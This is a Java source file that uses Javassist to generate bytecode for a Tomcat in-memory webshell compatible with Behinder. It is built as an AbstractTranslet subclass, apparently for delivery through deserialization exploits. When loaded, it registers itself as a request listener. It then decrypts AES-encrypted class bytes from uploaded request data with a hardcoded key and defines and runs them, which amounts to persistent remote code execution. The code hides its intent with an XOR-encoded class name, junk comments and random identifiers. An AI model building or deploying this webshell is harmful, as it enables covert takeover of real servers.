package org.memshell;

import javassist.*;

import java.io.IOException;
import java.util.UUID;

public class TomcatListenerBehinderByLei {
    public static byte[] generateListenerMemShell() throws CannotCompileException, NotFoundException, IOException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);

        CtClass abstractTransletClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        CtClass listenerClass = pool.get("javax.servlet.ServletRequestListener");

        // 继承父类
        ctClass.setSuperclass(abstractTransletClass);

        // 实现接口
        ctClass.setInterfaces(new CtClass[]{listenerClass});

        // 创建默认构造器
        CtConstructor ctConstructor = CtNewConstructor.defaultConstructor(ctClass);
        ctClass.addConstructor(ctConstructor);

        // 创建transform方法
        CtMethod transform = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform);

        // 创建transform方法
        CtMethod transform1 = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform1);

        // 创建requestDestroyed方法
        CtMethod requestDestroyed = CtNewMethod.make("public void requestDestroyed(javax.servlet.ServletRequestEvent servletRequestEvent) {}", ctClass);
        ctClass.addMethod(requestDestroyed);

        // 创建Af06k方法
        CtMethod Af06k = CtNewMethod.make("public byte[] Af06k(String Strings, String k) {\n" +
                "        try {\n" +
                "            javax.crypto.Cipher B212m1 = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n" +
                "            B212m1.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\"));\n" +
                "            int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};\n" +
                "            String ccstr = \"\";\n" +
                "            for (int i = 0; i < aa.length; i++) {\n" +
                "                aa[i] = aa[i] ^ 0x010;\n" +
                "                ccstr = ccstr + (char) aa[i];\n" +
                "            }\n" +
                "            byte[] bytes = (byte[]) Class.forName(ccstr).getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(Class.forName(ccstr).newInstance(), new Object[]{Strings});\n" +
                "            byte[] result = (byte[]) B212m1.getClass()./*ZaX36l899U*/getDeclaredMethod/*ZaX36l899U*/(\"doFinal\", new Class[]{byte[].class}).invoke(B212m1, new Object[]{bytes});\n" +
                "            return result;\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "            return null;\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(Af06k);

        // 创建requestInitialized方法
        CtMethod requestInitialized = CtNewMethod.make("public void requestInitialized(javax.servlet.ServletRequestEvent servletRequestEvent) {\n" +
                "        org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) servletRequestEvent.getServletRequest();\n" +
                "        org.apache.catalina.connector.Request request = null;\n" +
                "        try {\n" +
                "            java.lang.reflect.Field requestField = requestFacade.getClass().getDeclaredField(\"request\");\n" +
                "            requestField.setAccessible(true);\n" +
                "            request = (org.apache.catalina.connector.Request) requestField.get(requestFacade);\n" +
                "            org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "            org.apache.tomcat.util.http.fileupload.disk.DiskFileItemFactory diskFileItemFactory = new org.apache.tomcat.util.http.fileupload.disk.DiskFileItemFactory();\n" +
                "            org.apache.tomcat.util.http.fileupload.servlet.ServletFileUpload fileUpload = new org.apache.tomcat.util.http.fileupload.servlet.ServletFileUpload(diskFileItemFactory);\n" +
                "            fileUpload.setHeaderEncoding(\"UTF-8\");\n" +
                "            java.util.List fileItems = fileUpload.parseRequest(new org.apache.tomcat.util.http.fileupload.servlet.ServletRequestContext(request));\n" +
                "            org.apache.tomcat.util.http.fileupload.FileItem fileItem = fileItems.get(1);\n" +
                "            java.io.InputStream inputStream = fileItem.getInputStream();\n" +
                "            byte[] bytes = new byte[inputStream.available()];\n" +
                "            inputStream.read(bytes);\n" +
                "            javax.servlet.http.HttpSession session = request.getSession();\n" +
                "            java.util.HashMap pageContext = new java.util.HashMap();\n" +
                "            pageContext.put(\"request\", request);\n" +
                "            pageContext.put(\"response\", response);\n" +
                "            pageContext.put(\"session\", session);\n" +
                "            String K6W9ZR9 = \"47bce5c74f589f48\";\n" +
                "            session.putValue(\"u\", K6W9ZR9);\n" +
                "            byte[] I5D61KH = Af06k(new String(bytes), K6W9ZR9);\n" +
                "            java.lang.reflect.Method Af06k = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class,int.class});\n" +
                "            Af06k.setAccessible(true);\n" +
                "            java.lang.ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();"+
                "            Object[] invokeParams = new Object[]{I5D61KH, Integer.valueOf(0), Integer.valueOf(I5D61KH.length)};" +
                "            Class i = (Class) Af06k.invoke(contextClassLoader, invokeParams);\n" +
                "            Object Q1K2 = i./*ZaX36l899U*/newInstance();\n" +
                "            Q1K2.equals(pageContext);\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(requestInitialized);

        // 创建静态方法块
        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = ((org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader());\n" +
                "            java.lang.reflect.Field resources = java.lang.Class.forName(\"org.apache.catalina.loader.WebappClassLoaderBase\").getDeclaredField(\"resources\");\n" +
                "            resources.setAccessible(true);\n" +
                "            org.apache.catalina.WebResourceRoot webResourceRoot = (org.apache.catalina.WebResourceRoot) resources.get(webappClassLoaderBase);\n" +
                "            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webResourceRoot.getContext();"+
                "            " + className + " " + className.toLowerCase() + " = new " + className + "();" +
                "            String listenerShellClassName = " + className.toLowerCase() + ".getClass().getName();" +
                "            standardContext.addApplicationListener(listenerShellClassName);" +
                "            java.util.List eventListeners = new java.util.ArrayList();" +
                "            eventListeners.add(" + className.toLowerCase() + ");" +
                "            Object[] applicationEventListeners = standardContext.getApplicationEventListeners();" +
                "            eventListeners.addAll(java.util.Arrays.asList(applicationEventListeners));" +
                "            standardContext.setApplicationEventListeners(eventListeners.toArray());" +
                "        } catch (Exception e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }");

        return ctClass.toBytecode();
    }
}
